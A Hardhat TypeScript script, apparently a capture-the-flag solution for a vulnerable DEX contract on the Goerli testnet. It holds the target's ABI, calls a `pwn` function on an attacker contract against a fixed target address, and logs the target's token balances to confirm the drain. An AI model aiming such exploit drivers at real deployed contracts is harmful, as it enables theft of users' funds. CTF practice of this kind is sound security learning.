import { ethers } from "hardhat"

const provider = new ethers.providers.JsonRpcProvider(
  process.env.GOERLI_RPC_URL
)

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x4feF30C4b40fbC07863c18d823eEd39a074452b6"
  const targetAbi = [
    {
      inputs: [],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "previousOwner",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "newOwner",
          type: "address",
        },
      ],
      name: "OwnershipTransferred",
      type: "event",
      signature:
        "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "token_address",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "amount",
          type: "uint256",
        },
      ],
      name: "addLiquidity",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x56688700",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "spender",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "amount",
          type: "uint256",
        },
      ],
      name: "approve",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x095ea7b3",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "token",
          type: "address",
        },
        {
          internalType: "address",
          name: "account",
          type: "address",
        },
      ],
      name: "balanceOf",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xf7888aec",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "from",
          type: "address",
        },
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "amount",
          type: "uint256",
        },
      ],
      name: "getSwapPrice",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xbfd7e00d",
    },
    {
      inputs: [],
      name: "owner",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x8da5cb5b",
    },
    {
      inputs: [],
      name: "renounceOwnership",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x715018a6",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "_token1",
          type: "address",
        },
        {
          internalType: "address",
          name: "_token2",
          type: "address",
        },
      ],
      name: "setTokens",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xcbc7854e",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "from",
          type: "address",
        },
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "amount",
          type: "uint256",
        },
      ],
      name: "swap",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xdf791e50",
    },
    {
      inputs: [],
      name: "token1",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xd21220a7",
    },
    {
      inputs: [],
      name: "token2",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x25be124e",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "newOwner",
          type: "address",
        },
      ],
      name: "transferOwnership",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xf2fde38b",
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("Dex")
  // approve contact to pull token first
  // const tx = awsait target.approve(contract.address, 110, { gasLimit: 100000 })

  const tx = await contract.pwn(targetAddress, { gasLimit: 3000000 })

  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://goerli.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://goerli.etherscan.io/tx/${error?.transactionHash}`
    )
  }
  const token1 = await target.token1()
  const token2 = await target.token2()

  console.log(
    "balance token1",
    (await target.balanceOf(token1, target.address)).toString()
  )
  console.log(
    "balance token2",
    (await target.balanceOf(token2, target.address)).toString()
  )
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
